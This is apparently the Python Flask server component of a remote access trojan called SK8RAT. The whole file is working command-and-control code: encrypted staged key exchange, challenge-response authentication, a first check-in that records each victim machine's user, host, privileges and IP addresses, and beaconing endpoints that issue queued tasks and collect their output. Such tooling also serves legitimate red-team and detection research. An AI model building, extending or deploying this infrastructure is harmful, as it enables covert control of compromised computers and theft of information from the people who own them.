from flask_restful import Resource, reqparse
from flask import request, session
from models2 import (ListenerModel, TaskModel, SK8RATModel)
import nacl.secret
import nacl.utils
from nacl.public import PrivateKey, SealedBox
from nacl import encoding
import base64
import random
import string
import json


#  /stage0
class NegotiateSessionKey(Resource):
    def post(self):
        # Get raw request
        request_raw = request.data.decode("UTF-8")    
  
        # Split by ":"
        post_data = request_raw.split(":")
        guid = post_data[0]
        nonce = base64.b64decode(post_data[1])
        ciphertext = base64.b64decode(post_data[2])

        # Grab shared key from listener
        Listener = ListenerModel.query.filter(ListenerModel.listener_type == "http").first()
        sharedkey = base64.b64decode(Listener.shared_key)

        # Decode ciphertext using pynacl
        box = nacl.secret.SecretBox(sharedkey)
        client_publickey = box.decrypt(ciphertext, nonce)

        # Generate final session key
        session_key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)

        # Write SK8RAT to database with agent name + b64(sessionkey)
        new_SK8RAT = SK8RATModel(
            name=''.join(random.choices(string.ascii_uppercase + string.digits, k=15)),
            guid=guid,
            session_key=base64.b64encode(session_key).decode("UTF-8"),
            session_cookie=''.join(random.choices(string.ascii_uppercase + string.digits, k=15)),
            external_ip=request.remote_addr
        )
        new_SK8RAT.save_to_db()

        # Use sealed box to send session key to SK8RAT
        publickey = nacl.public.PublicKey(client_publickey)
        sealed_box = SealedBox(publickey)
        encrypted = sealed_box.encrypt(session_key)

        return base64.b64encode(encrypted).decode("UTF-8")


# /stage1
class ChallengeResponseOne(Resource):
    def post(self):
        # Get raw request
        request_raw = request.data.decode("UTF-8")

        # Split by ":"
        post_data = request_raw.split(":")
        guid = post_data[0]
        nonce = base64.b64decode(post_data[1])
        ciphertext = base64.b64decode(post_data[2])

        # Obtain sessionkey from database
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.guid == guid).first()
        session_key = base64.b64decode(SK8RAT.session_key)

        # Decode ciphertext using pynacl
        box = nacl.secret.SecretBox(session_key)
        client_challenge = box.decrypt(ciphertext, nonce)

        # Stuff client and server challenge into db
        server_challenge = nacl.utils.random(4)
        SK8RAT.client_challenge = base64.b64encode(client_challenge).decode("UTF-8")
        SK8RAT.server_challenge = base64.b64encode(server_challenge).decode("UTF-8")
        SK8RAT.save_to_db()

        # Prepare server response K[client_challenge + server_challenge]
        message = client_challenge + server_challenge
        box = nacl.secret.SecretBox(session_key)
        nonce = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
        encrypted = box.encrypt(message, nonce)
        ciphertext = encrypted.ciphertext
        ciphertext_b64 = base64.b64encode(ciphertext).decode("UTF-8")
        nonce_b64 = base64.b64encode(nonce).decode("UTF-8")
        server_response = nonce_b64 + ":" + ciphertext_b64

        return server_response


# /stage2
class ChallengeResponseTwo(Resource):
    def post(self):
        # Get raw request
        request_raw = request.data.decode("UTF-8")

        # Split by ":"
        post_data = request_raw.split(":")
        guid = post_data[0]
        nonce = base64.b64decode(post_data[1])
        ciphertext = base64.b64decode(post_data[2])

        # Obtain sessionkey from database
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.guid == guid).first()
        session_key = base64.b64decode(SK8RAT.session_key)

        # Obtain server_challenge from database
        server_challenge = base64.b64decode(SK8RAT.server_challenge)

        # Decode ciphertext using pynacl
        box = nacl.secret.SecretBox(session_key)
        server_challenge_returned = box.decrypt(ciphertext, nonce)

        # return K[session_cookie] if challenge matches, else return 0
        if (server_challenge == server_challenge_returned):
            message = (SK8RAT.session_cookie).encode("UTF-8")
            box = nacl.secret.SecretBox(session_key)
            nonce_server = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
            encrypted = box.encrypt(message, nonce_server)
            ciphertext = encrypted.ciphertext
            ciphertext_b64 = base64.b64encode(ciphertext).decode("UTF-8")
            nonce_b64 = base64.b64encode(nonce_server).decode("UTF-8")
            server_response = nonce_b64 + ":" + ciphertext_b64
            return server_response
        else:
            return {'message': 'Potential MITM!'}


# /stage3
class FirstCheckIn(Resource):
    def post(self):
        # Get raw request
        request_raw = request.data.decode("UTF-8")

        # Split by ":"
        post_data = request_raw.split(":")
        nonce = base64.b64decode(post_data[0])
        ciphertext = base64.b64decode(post_data[1])

        # Read session cookie and grab corresponding session key, if cookie is invalid throw error
        session_cookie = request.cookies.get('macaroon')
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.session_cookie == session_cookie).first()
        if (SK8RAT):
            session_key = base64.b64decode(SK8RAT.session_key)
        else:
            return {'message': 'Bad cookie.'}
        
        # Decode ciphertext using pynacl, store as json object
        box = nacl.secret.SecretBox(session_key)
        json_string = box.decrypt(ciphertext, nonce)
        json_blob = json.loads(json_string)

        # Parse json object and update database
        SK8RAT.username = json_blob['username']
        SK8RAT.hostname = json_blob['hostname']
        SK8RAT.pid = json_blob['pid']
        SK8RAT.internal_ip = json_blob['internal_ip']
        SK8RAT.admin = json_blob['admin']
        SK8RAT.os = json_blob['os']
        SK8RAT.listener_id = json_blob['listener_id']
        SK8RAT.server_ip = json_blob['server_ip']
        SK8RAT.sleep = json_blob['sleep']
        SK8RAT.jitter = json_blob['jitter']
        SK8RAT.last_seen = json_blob['last_seen']
        SK8RAT.save_to_db()

        return 1


# /beaconing
class Beaconing(Resource):
    def get(self):
        
        # Read session cookie and grab corresponding session key, if cookie is invalid throw error
        session_cookie = request.cookies.get('macaroon')
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.session_cookie == session_cookie).first()
        if (SK8RAT):
            session_key = base64.b64decode(SK8RAT.session_key)
        else:
            return {'message': 'Bad cookie.'}

        task = TaskModel.query.filter(TaskModel.guid == SK8RAT.guid).filter(TaskModel.task_status == "wait").all()        

        # Assemble task_id, task, task_status, task_output
        task_id_list = []
        task_list = []
        task_status_list = []
        task_output_list = []
        for x in task:
            task_id_list.append(x.task_id)
            task_list.append(x.task)
            task_status_list.append(x.task_status)
            task_output_list.append(x.task_output)

        # Assemble complete message
        # <SK8RAT_Message Structure>
        # guid
        # last_seen
        # sleep
        # jitter
        # task_id
        # task
        # task_status
        # task_output
        data = {}
        data['guid'] = SK8RAT.guid
        data['last_seen'] = SK8RAT.last_seen
        data['sleep'] = SK8RAT.sleep
        data['jitter'] = SK8RAT.jitter
        data['task_id'] = task_id_list
        data['task'] = task_list
        data['task_status'] = task_status_list
        data['task_output'] = task_output_list

        # Server response assembled
        json_data = json.dumps(data)

        # Encrypt server response
        message = json_data
        box = nacl.secret.SecretBox(session_key)
        nonce = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
        encrypted = box.encrypt(message.encode("UTF=8"), nonce)
        ciphertext = encrypted.ciphertext
        ciphertext_b64 = base64.b64encode(ciphertext).decode("UTF-8")
        nonce_b64 = base64.b64encode(nonce).decode("UTF-8")
        server_response = nonce_b64 + ":" + ciphertext_b64

        return server_response

    def post(self):
        # Get raw request
        request_raw = request.data.decode("UTF-8")

        # Split by ":"
        post_data = request_raw.split(":")
        nonce = base64.b64decode(post_data[0])
        ciphertext = base64.b64decode(post_data[1])

        # Read session cookie and grab corresponding session key, if cookie is invalid throw error
        session_cookie = request.cookies.get('macaroon')
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.session_cookie == session_cookie).first()
        if (SK8RAT):
            session_key = base64.b64decode(SK8RAT.session_key)
        else:
            return {'message': 'Bad cookie.'}
        
        # Decode ciphertext using pynacl, store as json object
        box = nacl.secret.SecretBox(session_key)
        json_string = box.decrypt(ciphertext, nonce)
        json_blob = json.loads(json_string)

        # <SK8RAT_Message Structure>
        # guid
        # last_seen
        # sleep
        # jitter
        # task_id
        # task
        # task_status
        # task_output

        # Update last_seen in database
        SK8RAT.last_seen = json_blob['last_seen']
        SK8RAT.save_to_db()

        # Loop through and match task_id and guid to retrieve correct TaskModel
        counter = 0
        for x in json_blob['task_id']:
            Task = TaskModel.query.filter(TaskModel.guid == SK8RAT.guid).filter(TaskModel.task_id == x).first()
            Task.task_status = json_blob['task_status'][counter]
            Task.task_output = json_blob['task_output'][counter]
            Task.save_to_db()
            counter = counter + 1

